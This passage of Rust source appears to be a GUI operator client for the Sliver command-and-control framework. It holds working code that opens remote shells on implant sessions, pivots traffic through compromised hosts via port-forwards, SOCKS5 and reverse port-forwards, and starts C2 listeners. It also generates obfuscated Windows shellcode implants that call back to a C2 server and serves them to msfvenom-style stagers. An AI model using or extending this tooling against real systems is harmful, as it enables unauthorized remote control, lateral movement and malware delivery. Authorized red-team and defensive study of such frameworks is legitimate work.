                    None => rep.fail("websites(list)", "test content not listed"),
                },
                Err(e) => rep.fail("websites(list)", e.message()),
            }
            match c.website_remove_content(clientpb::WebsiteRemoveContent { name: site.clone(), paths: vec!["/gui-test.txt".into()] }).await {
                Ok(_) => rep.pass("website-remove-content", "/gui-test.txt"), Err(e) => rep.fail("website-remove-content", e.message()),
            }
            match c.website_remove(clientpb::Website { name: site.clone(), ..Default::default() }).await {
                Ok(_) => rep.pass("website-remove", site.clone()), Err(e) => rep.fail("website-remove", e.message()),
            }
        }
        Err(e) => rep.fail("website-add-content", e.message()),
    }
    // DNS listener lifecycle
    match c.start_dns_listener(clientpb::DnsListenerReq { domains: vec!["gui.test.".into()], host: "0.0.0.0".into(), port: 5353, canaries: false, enforce_otp: false }).await {
        Ok(r) => {
            let jid = r.into_inner().job_id;
            rep.pass("start-dns-listener", format!("job {jid}"));
            match c.kill_job(clientpb::KillJobReq { id: jid }).await {
                Ok(_) => rep.pass("kill-job(dns)", format!("job {jid}")), Err(e) => rep.fail("kill-job(dns)", e.message()),
            }
        }
        Err(e) => rep.fail("start-dns-listener", e.message()),
    }
    battery_admin::admin_checks(c, rep).await;
}

/// Full create_tunnel → bind → shell → TunnelData round-trip (raw or PTY).
async fn shell_roundtrip(c: &mut Rpc, sid: &str, pty: bool, win: bool) -> Result<String, String> {
    let (out_tx, out_rx) = mpsc::unbounded_channel::<sliverpb::TunnelData>();
    // Create the tunnel FIRST so we can prime the request stream with its bind
    // frame; grpc-go only sends response headers after the first client frame,
    // so an empty request stream makes tunnel_data(...).await block forever.
    let tunnel = match c.create_tunnel(sliverpb::Tunnel { session_id: sid.to_string(), ..Default::default() }).await {
        Ok(r) => r.into_inner(),
        Err(e) => return Err(format!("create_tunnel: {}", e.message())),
    };
    let tid = tunnel.tunnel_id;
    let _ = out_tx.send(sliverpb::TunnelData { tunnel_id: tid, session_id: sid.to_string(), ..Default::default() });
    let req_stream = UnboundedReceiverStream::new(out_rx);
    let mut cc = c.clone();
    let resp = match tokio::time::timeout(Duration::from_secs(10), cc.tunnel_data(req_stream)).await {
        Ok(Ok(r)) => r,
        Ok(Err(e)) => return Err(format!("tunnel_data: {}", e.message())),
        Err(_) => return Err("tunnel_data open timed out".into()),
    };

    let collected = Arc::new(Mutex::new(Vec::<u8>::new()));
    let (bind_tx, bind_rx) = oneshot::channel::<()>();
    let coll2 = collected.clone();
    tokio::spawn(async move {
        let mut stream = resp.into_inner();
        let mut bind_tx = Some(bind_tx);
        loop {
            match stream.message().await {
                Ok(Some(f)) => {
                    if f.data.is_empty() && !f.closed { if let Some(tx) = bind_tx.take() { let _ = tx.send(()); } }
                    else if !f.data.is_empty() { coll2.lock().extend_from_slice(&f.data); }
                }
                _ => break,
            }
        }
    });

    let _ = tokio::time::timeout(Duration::from_secs(10), bind_rx).await;
    let t = Target::session(sid);
    let (rows, cols) = if pty { (34, 120) } else { (0, 0) };
    match tokio::time::timeout(Duration::from_secs(15),
        c.shell(sliverpb::ShellReq { path: if win { "C:\\Windows\\System32\\cmd.exe".into() } else { "/bin/sh".into() }, enable_pty: pty, pid: 0, rows, cols, tunnel_id: tid, request: Some(t.request(10)) })).await {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => return Err(format!("shell: {}", e.message())),
        Err(_) => return Err("shell RPC timed out".into()),
    }
    let marker = if pty { "PTY_RT_OK" } else { "RAW_RT_OK" };
    let _ = out_tx.send(sliverpb::TunnelData { tunnel_id: tid, session_id: sid.to_string(), data: format!("echo {marker}\n").into_bytes(), ..Default::default() });
    tokio::time::sleep(Duration::from_secs(3)).await;
    let got = String::from_utf8_lossy(&collected.lock()).to_string();
    let _ = tokio::time::timeout(Duration::from_secs(5), c.close_tunnel(sliverpb::Tunnel { tunnel_id: tid, session_id: sid.to_string(), ..Default::default() })).await;
    if got.contains(marker) { Ok(format!("echoed {} bytes incl. marker", got.len())) }
    else { Err(format!("marker not seen; {} bytes: {:?}", got.len(), got.chars().take(80).collect::<String>())) }
}

/// Render a beacon task's content into a console title + body.
fn render_beacon_task(tk: &clientpb::BeaconTask) -> (String, String) {
    use prost::Message as _;
    let short = &tk.id[..tk.id.len().min(8)];
    let title = format!("beacon task {short} — {} [{}]", tk.description, tk.state);
    let mut body = String::new();
    if !tk.response.is_empty() {
        if let Ok(ex) = sliverpb::Execute::decode(tk.response.as_slice()) {
            if !ex.stdout.is_empty() { body.push_str(&String::from_utf8_lossy(&ex.stdout)); }
            if !ex.stderr.is_empty() { body.push_str("\n[stderr]\n"); body.push_str(&String::from_utf8_lossy(&ex.stderr)); }
        }
        if body.trim().is_empty() {
            body = format!("{} ({} bytes of response data)", tk.state, tk.response.len());
        }
    } else {
        body = format!("state: {} (no response yet)", tk.state);
    }
    (title, body)
}

// --------------------------- Pivoting: port-forward ---------------------------

/// Start a local TCP listener that forwards each connection through the implant
/// to `remote_host:remote_port` over the shared tunnel data plane.
#[allow(clippy::too_many_arguments)]
async fn start_portfwd(
    rpc: Rpc, hub: TunnelHandle, pivots: Pivots, ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>, target: Target,
    bind: String, remote_host: String, remote_port: u32,
) {
    use std::sync::atomic::{AtomicUsize, Ordering::Relaxed};
    let session_id = target.session_id.clone();
    if session_id.is_empty() {
        let _ = upd_tx.send(Update::Notice { ok: false, text: "port-forward requires a session (not a beacon)".into() });
        return;
    }
    let listener = match TcpListener::bind(&bind).await {
        Ok(l) => l,
        Err(e) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("bind {bind}: {e}") }); return; }
    };
    let conns = Arc::new(AtomicUsize::new(0));
    let dest = format!("{remote_host}:{remote_port}");
    let (a_rpc, a_hub, a_conns, a_sid, a_host, a_upd) = (rpc.clone(), hub.clone(), conns.clone(), session_id.clone(), remote_host.clone(), upd_tx.clone());
    let handle = tokio::spawn(async move {
        let mut set = tokio::task::JoinSet::new();
        loop {
            tokio::select! {
                accept = listener.accept() => {
                    let Ok((sock, _)) = accept else { break };
                    let (rpc, hub, sid, host, conns, upd) = (a_rpc.clone(), a_hub.clone(), a_sid.clone(), a_host.clone(), a_conns.clone(), a_upd.clone());
                    set.spawn(async move {
                        conns.fetch_add(1, Relaxed);
                        if let Err(e) = portfwd_conn(rpc, hub, sid, host.clone(), remote_port, sock).await {
                            let _ = upd.send(Update::Notice { ok: false, text: format!("port-forward to {host}:{remote_port}: {e}") });
                        }
                        conns.fetch_sub(1, Relaxed);
                    });
                }
                Some(_) = set.join_next(), if !set.is_empty() => {}
            }
        }
    });
    {
        let mut reg = pivots.lock().await;
        reg.next_id += 1;
        let id = reg.next_id;
        reg.items.push(PivotEntry { id, kind: "portfwd", bind: bind.clone(), dest: dest.clone(), session: session_id, conns, abort: handle.abort_handle(), rportfwd_id: None });
    }
    let _ = upd_tx.send(Update::Notice { ok: true, text: format!("port-forward {bind} → {dest}") });
    push_pivots(&pivots, &upd_tx, &ctx).await;
}

/// `PortfwdReq.Protocol` for TCP. v1.7.9 implants reject 0 ("unsupported port forward
/// protocol 0"); the proto carries no enum for it.
pub(crate) const PORTFWD_TCP: i32 = 1;

/// One forwarded connection: create+bind a tunnel, ask the implant to dial the
/// remote, then pump bytes both ways. Errors before the pump starts are returned.
async fn portfwd_conn(mut rpc: Rpc, hub: TunnelHandle, sid: String, host: String, port: u32, sock: TcpStream) -> Result<(), String> {
    let tunnel = rpc.create_tunnel(sliverpb::Tunnel { session_id: sid.clone(), ..Default::default() }).await
        .map_err(|e| format!("create tunnel: {}", e.message()))?.into_inner();
    let tid = tunnel.tunnel_id;
    let (data_tx, mut data_rx) = mpsc::unbounded_channel::<Vec<u8>>();
    let bind_frame = sliverpb::TunnelData { tunnel_id: tid, session_id: sid.clone(), ..Default::default() };
    let (bind_rx, hubc) = {
        let mut guard = hub.lock().await;
        let (btx, brx) = oneshot::channel();
        if let Some(h) = guard.as_ref() {
            h.bind_waiters.lock().insert(tid, btx);
            h.open.lock().insert(tid);
            h.sinks.lock().insert(tid, data_tx);
            h.send(bind_frame);
            (brx, h.clone())
        } else {
            let (h, out_rx) = TunnelHub::new();
            h.bind_waiters.lock().insert(tid, btx);
            h.open.lock().insert(tid);
            h.sinks.lock().insert(tid, data_tx);
            h.send(bind_frame);
            // ctx/upd not needed for portfwd reader routing; use throwaway channel.
            let (nctx, nupd) = (egui::Context::default(), crossbeam_channel::unbounded().0);
            if !open_tunnel_stream(rpc.clone(), nctx, nupd, h.clone(), out_rx).await { return Err("could not open the tunnel stream".into()); }
            *guard = Some(h.clone());
            (brx, h)
        }
    };
    let _ = tokio::time::timeout(Duration::from_secs(10), bind_rx).await;

    let t = Target::session(&sid);
    let fail = |e: String| {
        let _ = hubc.send(sliverpb::TunnelData { tunnel_id: tid, session_id: sid.clone(), closed: true, ..Default::default() });
        hubc.sinks.lock().remove(&tid);
        Err(e)
    };
    match rpc.portfwd(sliverpb::PortfwdReq {
        port, protocol: PORTFWD_TCP, host, keep_alive: -1, tunnel_id: tid, request: Some(t.request(30)),
    }).await {
        Err(e) => return fail(format!("portfwd: {}", e.message())),
        Ok(r) => if let Some(e) = r.into_inner().response.map(|x| x.err).filter(|e| !e.is_empty()) { return fail(format!("portfwd: {e}")); },
    }

    let (mut rd, mut wr) = sock.into_split();
    let mut buf = vec![0u8; 16 * 1024];
    loop {
        tokio::select! {
            r = rd.read(&mut buf) => match r {
                Ok(0) | Err(_) => break,
                Ok(n) => hubc.send(sliverpb::TunnelData { tunnel_id: tid, session_id: sid.clone(), data: buf[..n].to_vec(), ..Default::default() }),
            },
            msg = data_rx.recv() => match msg {
                Some(data) => { if wr.write_all(&data).await.is_err() { break; } }
                None => break, // sink dropped (tunnel closed by implant)
            },
        }
    }
    let _ = hubc.send(sliverpb::TunnelData { tunnel_id: tid, session_id: sid.clone(), closed: true, ..Default::default() });
    hubc.sinks.lock().remove(&tid);
    hubc.open.lock().remove(&tid);
    let _ = rpc.close_tunnel(sliverpb::Tunnel { tunnel_id: tid, session_id: sid, ..Default::default() }).await;
    Ok(())
}

// ------------------------------ Pivoting: SOCKS ------------------------------

/// Open the shared `SocksProxy` stream, primed with `first` so grpc-go emits
/// response headers. Routes inbound frames to per-connection sinks by tunnel id.
async fn open_socks_stream(rpc: Rpc, hub: SocksHub, out_rx: UnboundedReceiver<sliverpb::SocksData>) -> bool {
    let req_stream = UnboundedReceiverStream::new(out_rx);
    let mut c = rpc;
    let resp = match tokio::time::timeout(Duration::from_secs(10), c.socks_proxy(req_stream)).await {
        Ok(Ok(r)) => r, _ => return false,
    };
    tokio::spawn(async move {
        let mut stream = resp.into_inner();
        while let Ok(Some(frame)) = stream.message().await {
            if let Some(sink) = hub.sinks.lock().get(&frame.tunnel_id).cloned() {
                let _ = sink.send(frame);
            }
        }
    });
    true
}

/// Start a local SOCKS5 listener; the implant runs the actual SOCKS server.
async fn start_socks(
    rpc: Rpc, socks: SocksHandle, pivots: Pivots, ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>, target: Target, bind: String,
) {
    use std::sync::atomic::{AtomicUsize, Ordering::Relaxed};
    let session_id = target.session_id.clone();
    if session_id.is_empty() {
        let _ = upd_tx.send(Update::Notice { ok: false, text: "SOCKS requires a session (not a beacon)".into() });
        return;
    }
    let listener = match TcpListener::bind(&bind).await {
        Ok(l) => l,
        Err(e) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("bind {bind}: {e}") }); return; }
    };
    let conns = Arc::new(AtomicUsize::new(0));
    let (a_rpc, a_socks, a_conns, a_sid) = (rpc.clone(), socks.clone(), conns.clone(), session_id.clone());
    let handle = tokio::spawn(async move {
        let mut set = tokio::task::JoinSet::new();
        loop {
            tokio::select! {
                accept = listener.accept() => {
                    let Ok((sock, _)) = accept else { break };
                    let (rpc, socks, sid, conns) = (a_rpc.clone(), a_socks.clone(), a_sid.clone(), a_conns.clone());
                    set.spawn(async move {
                        conns.fetch_add(1, Relaxed);
                        socks_conn(rpc, socks, sid, sock).await;
                        conns.fetch_sub(1, Relaxed);
                    });
                }
                Some(_) = set.join_next(), if !set.is_empty() => {}
            }
        }
    });
    {
        let mut reg = pivots.lock().await;
        reg.next_id += 1;
        let id = reg.next_id;
        reg.items.push(PivotEntry { id, kind: "socks5", bind: bind.clone(), dest: "via implant".into(), session: session_id, conns, abort: handle.abort_handle(), rportfwd_id: None });
    }
    let _ = upd_tx.send(Update::Notice { ok: true, text: format!("SOCKS5 proxy on {bind}") });
    push_pivots(&pivots, &upd_tx, &ctx).await;
}

/// One SOCKS client connection: CreateSocks → pipe raw bytes over SocksProxy.
async fn socks_conn(mut rpc: Rpc, socks: SocksHandle, sid: String, sock: TcpStream) {
    let s = match rpc.create_socks(sliverpb::Socks { session_id: sid.clone(), ..Default::default() }).await {
        Ok(r) => r.into_inner(), Err(_) => return,
    };
    let tid = s.tunnel_id;
    let req = || Some(commonpb::Request { session_id: sid.clone(), ..Default::default() });
    let (in_tx, mut in_rx) = mpsc::unbounded_channel::<sliverpb::SocksData>();
    let (mut rd, mut wr) = sock.into_split();
    let mut buf = vec![0u8; 16 * 1024];

    // Read the first chunk (the SOCKS5 greeting) to prime the stream.
    let first_n = match rd.read(&mut buf).await { Ok(0) | Err(_) => { let _ = rpc.close_socks(sliverpb::Socks { tunnel_id: tid, session_id: sid, ..Default::default() }).await; return; } Ok(n) => n };
    let mut seq = 0u64;
    let first = sliverpb::SocksData { tunnel_id: tid, data: buf[..first_n].to_vec(), sequence: seq, request: req(), ..Default::default() };
    seq += 1;

    let hubc = {
        let mut guard = socks.lock().await;
        if let Some(h) = guard.as_ref() {
            h.sinks.lock().insert(tid, in_tx);
            h.send(first);
            h.clone()
        } else {
            let (h, out_rx) = SocksHub::new();
            h.sinks.lock().insert(tid, in_tx);
            h.send(first);
            if !open_socks_stream(rpc.clone(), h.clone(), out_rx).await { return; }
            *guard = Some(h.clone());
            h
        }
    };

    loop {
        tokio::select! {
            r = rd.read(&mut buf) => match r {
                Ok(0) | Err(_) => break,
                Ok(n) => { hubc.send(sliverpb::SocksData { tunnel_id: tid, data: buf[..n].to_vec(), sequence: seq, request: req(), ..Default::default() }); seq += 1; }
            },
            msg = in_rx.recv() => match msg {
                Some(sd) => {
                    if sd.close_conn { break; }
                    if !sd.data.is_empty() && wr.write_all(&sd.data).await.is_err() { break; }
                }
                None => break,
            },
        }
    }
    hubc.send(sliverpb::SocksData { tunnel_id: tid, close_conn: true, request: req(), ..Default::default() });
    hubc.sinks.lock().remove(&tid);
    let _ = rpc.close_socks(sliverpb::Socks { tunnel_id: tid, session_id: sid, ..Default::default() }).await;
}

// ------------------------- Pivoting: reverse port-fwd -------------------------

/// Start a reverse port-forward: the implant listens on `bind_addr:bind_port`
/// and the server forwards connections to `fwd_addr:fwd_port`.
#[allow(clippy::too_many_arguments)]
async fn start_rportfwd(
    c: &mut Rpc, _hub: TunnelHandle, pivots: Pivots, ctx: egui::Context,
    upd_tx: crossbeam_channel::Sender<Update>, target: Target,
    bind_addr: String, bind_port: u32, fwd_addr: String, fwd_port: u32,
) {
    use std::sync::atomic::AtomicUsize;
    let session_id = target.session_id.clone();
    let req = sliverpb::RportFwdStartListenerReq {
        bind_address: bind_addr.clone(), bind_port,
        forward_address: fwd_addr.clone(), forward_port: fwd_port,
        keep_alive: -1, authorization_id: String::new(),
        request: Some(target.request(30)),
    };
    match start_rport_fwd(c, req).await {
        Ok(r) => {
            let l = r.into_inner();
            let mut reg = pivots.lock().await;
            reg.next_id += 1;
            let id = reg.next_id;
            // A placeholder aborted handle (nothing client-side to run).
            let noop = tokio::spawn(async {}).abort_handle();
            reg.items.push(PivotEntry {
                id, kind: "rportfwd",
                bind: format!("{bind_addr}:{bind_port}"),
                dest: format!("{fwd_addr}:{fwd_port}"),
                session: session_id, conns: Arc::new(AtomicUsize::new(0)),
                abort: noop, rportfwd_id: Some(l.id),
            });
            drop(reg);
            let _ = upd_tx.send(Update::Notice { ok: true, text: format!("reverse port-forward :{bind_port} → {fwd_addr}:{fwd_port}") });
            push_pivots(&pivots, &upd_tx, &ctx).await;
        }
        Err(e) => { let _ = upd_tx.send(Update::Notice { ok: false, text: format!("reverse port-forward: {}", e.message()) }); }
    }
}

/// Start a reverse port-forward. Newer servers (v1.7.9) want the bind and
/// forward addresses as "host:port"; older ones take the ports separately and
/// reject that form, so try the separate form first and fall back.
async fn start_rport_fwd(c: &mut Rpc, req: sliverpb::RportFwdStartListenerReq) -> Result<tonic::Response<sliverpb::RportFwdListener>, tonic::Status> {
    match c.start_rport_fwd_listener(req.clone()).await {
        Err(e) if e.message().contains("missing port in address") => {
            let bind_address = format!("{}:{}", req.bind_address, req.bind_port);
            let forward_address = format!("{}:{}", req.forward_address, req.forward_port);
            c.start_rport_fwd_listener(sliverpb::RportFwdStartListenerReq { bind_address, forward_address, ..req }).await
        }
        r => r,
    }
}

/// Stop and deregister a pivot by id.
async fn stop_pivot(c: &mut Rpc, pivots: &Pivots, id: u32) {
    let mut reg = pivots.lock().await;
    if let Some(pos) = reg.items.iter().position(|e| e.id == id) {
        let entry = reg.items.remove(pos);
        entry.abort.abort();
        if let Some(rid) = entry.rportfwd_id {
            let _ = c.stop_rport_fwd_listener(sliverpb::RportFwdStopListenerReq { id: rid, request: None }).await;
        }
    }
}

async fn start_listener(
    c: &mut Rpc,
    spec: ListenerSpec,
    upd_tx: &crossbeam_channel::Sender<Update>,
    ctx: &egui::Context,
) {
    macro_rules! push {
        ($u:expr) => {{ let _ = upd_tx.send($u); ctx.request_repaint(); }};
    }
    match launch_listener(c, spec.clone()).await {
        Ok((job_id, text)) => {
            push!(Update::ListenerStarted { job_id, spec });
            push!(Update::Notice { ok: true, text });
        }
        Err(e) => push!(Update::Notice { ok: false, text: e.message().into() }),
    }
}

/// Stop a listener and start its edited replacement. The old job's port can
/// take a moment to free up, so the start is retried briefly; if it still
/// fails, the original listener is started again so implants keep their C2.
async fn restart_listener(
    c: &mut Rpc,
    job_id: u32,
    spec: ListenerSpec,
    previous: Option<ListenerSpec>,
    upd_tx: &crossbeam_channel::Sender<Update>,
    ctx: &egui::Context,
) {
    macro_rules! push {
        ($u:expr) => {{ let _ = upd_tx.send($u); ctx.request_repaint(); }};
    }
    if let Err(e) = c.kill_job(clientpb::KillJobReq { id: job_id }).await {
        push!(Update::Notice { ok: false, text: format!("edit listener: could not stop job {job_id}: {}", e.message()) });
        return;
    }
    let mut last = Status::unknown("not started");
    for attempt in 0..4 {
        tokio::time::sleep(Duration::from_millis(if attempt == 0 { 500 } else { 1500 })).await;
        match launch_listener(c, spec.clone()).await {
            Ok((new_id, text)) => {
                push!(Update::ListenerStarted { job_id: new_id, spec });
                push!(Update::Notice { ok: true, text: format!("listener job {job_id} restarted with new settings: {text}") });
                return;
            }
            Err(e) => last = e,
        }
    }
    let err = last.message().to_string();
    match previous {
        Some(prev) => match launch_listener(c, prev.clone()).await {
            Ok((new_id, text)) => {
                push!(Update::ListenerStarted { job_id: new_id, spec: prev });
                push!(Update::Notice { ok: false, text: format!("edited listener failed to start ({err}); original restored: {text}") });
            }
            Err(e) => push!(Update::Notice { ok: false, text: format!("edited listener failed to start ({err}) and the original could not be restored ({}); job {job_id} is stopped", e.message()) }),
        },
        None => push!(Update::Notice { ok: false, text: format!("edited listener failed to start ({err}); job {job_id} is stopped") }),
    }
}

/// Start one listener; returns its job ID and a description for the toast.
async fn launch_listener(c: &mut Rpc, spec: ListenerSpec) -> Result<(u32, String), Status> {
    match spec {
        ListenerSpec::Mtls { host, port } => c
            .start_mtls_listener(clientpb::MtlsListenerReq { host, port })
            .await
            .map(|r| { let jid = r.into_inner().job_id; (jid, format!("mTLS listener job {jid}")) }),
        ListenerSpec::Https { host, domain, port, secure, website, tls } => {
            let site = website.trim().to_string();
            let (cert, key) = match &tls {
                ListenerTls::Files { cert, key } if secure => crate::app::certs::load_pair(cert, key).map_err(Status::invalid_argument)?,
                _ => (Vec::new(), Vec::new()),
            };
            c.start_https_listener(clientpb::HttpListenerReq {
                host,
                domain,
                port,
                secure,
                website: site.clone(),
                cert,
                key,
                acme: secure && tls == ListenerTls::Acme,
                ..Default::default()
            })
            .await
            .map(|r| {
                let jid = r.into_inner().job_id;
                (jid, if site.is_empty() { format!("HTTP(S) listener job {jid}") } else { format!("HTTP(S) listener job {jid} serving website '{site}'") })
            })
        }
        ListenerSpec::Dns { domains, host, port, canaries } => c
            .start_dns_listener(clientpb::DnsListenerReq { domains, host, port, canaries, enforce_otp: false })
            .await
            .map(|r| { let jid = r.into_inner().job_id; (jid, format!("DNS listener job {jid}")) }),
        ListenerSpec::Stage { bind_host, bind_port, c2 } => stage_listener(c, bind_host, bind_port, c2).await,
        ListenerSpec::Wg { host, port, nport, key_port } => c
            .start_wg_listener(clientpb::WgListenerReq { host, port, tun_ip: "100.64.0.1".into(), n_port: nport, key_port })
            .await
            .map(|r| { let jid = r.into_inner().job_id; (jid, format!("WireGuard listener job {jid} (udp/{port})")) }),
    }
}

/// All websites with their content metadata. `Websites` only names the sites,
/// so each is fetched individually; content bytes are dropped (the UI only
/// shows metadata, and hosted payloads can be large).
async fn list_websites(c: &mut Rpc) -> Result<Vec<clientpb::Website>, Status> {
    let names: Vec<String> = c.websites(commonpb::Empty {}).await?.into_inner().websites.into_iter().map(|w| w.name).collect();
    let mut sites = Vec::with_capacity(names.len());
    for name in names {
        let mut site = c.website(clientpb::Website { name, ..Default::default() }).await?.into_inner();
        for content in site.contents.values_mut() {
            content.content.clear();
        }
        sites.push(site);
    }
    Ok(sites)
}

/// Generate a Windows/amd64 shellcode stage (encrypted per build) that calls
/// back to `c2`, then start a TCP stage listener serving it. The matching
/// PowerShell stager stub is produced by msfvenom in the Sliver console.
/// msfvenom's TCP stagers (`custom/reverse_tcp`, `meterpreter/reverse_tcp`) read a 4-byte
/// little-endian length before the stage, but Sliver's TCP stage listener sends the bytes
/// as-is. Without it the stub reads the shellcode's first 4 bytes as a ~4 GB length and hangs.
fn prepend_stage_size(data: Vec<u8>) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len() + 4);
    out.extend_from_slice(&(data.len() as u32).to_le_bytes());
    out.extend(data);
    out
}

async fn stage_listener(c: &mut Rpc, bind_host: String, bind_port: u32, c2: String) -> Result<(u32, String), Status> {
    let c2 = c2.trim().trim_start_matches("mtls://");
    let c2 = if c2.contains(':') { c2.to_string() } else { format!("{c2}:8888") };
    let ns = 1_000_000_000i64;
    let config = clientpb::ImplantConfig {
        goos: "windows".into(),
        goarch: "amd64".into(),
        format: 1, // SHELLCODE
        is_shellcode: true,
        shellcode_config: Some(clientpb::ShellcodeConfig { entropy: 3, compress: 1, ..Default::default() }),
        obfuscate_symbols: true,
        c2: vec![clientpb::ImplantC2 { id: String::new(), priority: 0, url: format!("mtls://{c2}"), options: String::new() }],
        include_mtls: true,
        reconnect_interval: 60 * ns,
        max_connection_errors: 1000,
        poll_timeout: 360 * ns,
        template_name: "sliver".into(),
        httpc2_config_name: "default".into(),
        ..Default::default()
    };
    let name = format!("stage-{bind_port}");
    let gen = c.generate(clientpb::GenerateReq { config: Some(config), name }).await?;
    let data = gen.into_inner().file.map(|f| f.data).unwrap_or_default();
    if data.is_empty() {
        return Err(Status::internal("stage generation returned no shellcode"));
    }
    let n = data.len();
    let r = c
        .start_tcp_stager_listener(clientpb::StagerListenerReq {
            protocol: 0, // StageProtocol::TCP
            host: bind_host,
            port: bind_port,
            data: prepend_stage_size(data),
            profile_name: String::new(),
        })
        .await?;
    let jid = r.into_inner().job_id;
    Ok((jid, format!("stage listener job {jid} — serving {n}-byte shellcode stage")))
}

#[cfg(test)]
mod tests {
    #[test]
    fn tcp_stage_gets_le_length_prefix() {
        let out = super::prepend_stage_size(vec![0x48, 0x83, 0xe4]);
        assert_eq!(out, vec![3, 0, 0, 0, 0x48, 0x83, 0xe4]);
    }

    use super::{commonpb, deliver_build, Update};

    #[test]
    fn builds_are_handed_to_the_ui_or_written_for_hooks() {
        let file = || Some(commonpb::File { name: "TEST.exe".into(), data: vec![1, 2, 3], ..Default::default() });
        // No folder: the UI gets the bytes and prompts for a location.
        match deliver_build("TEST".into(), file(), None) {
            Update::BuildReady { name, file_name, data } => assert_eq!((name.as_str(), file_name.as_str(), data.len()), ("TEST", "TEST.exe", 3)),
            _ => panic!("expected BuildReady"),
        }
        // A folder (headless hooks): written straight there.
        let dir = std::env::temp_dir().join(format!("sliver-gui-build-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        match deliver_build("TEST".into(), file(), Some(dir.to_str().unwrap())) {
            Update::GenerateDone { ok: true, path, .. } => assert_eq!(std::fs::read(&path).unwrap(), vec![1, 2, 3]),
            _ => panic!("expected a written file"),
        }
        std::fs::remove_dir_all(&dir).unwrap();
        // An empty file is an error, not a prompt.
        assert!(matches!(deliver_build("TEST".into(), Some(commonpb::File::default()), None), Update::GenerateDone { ok: false, .. }));
    }
}
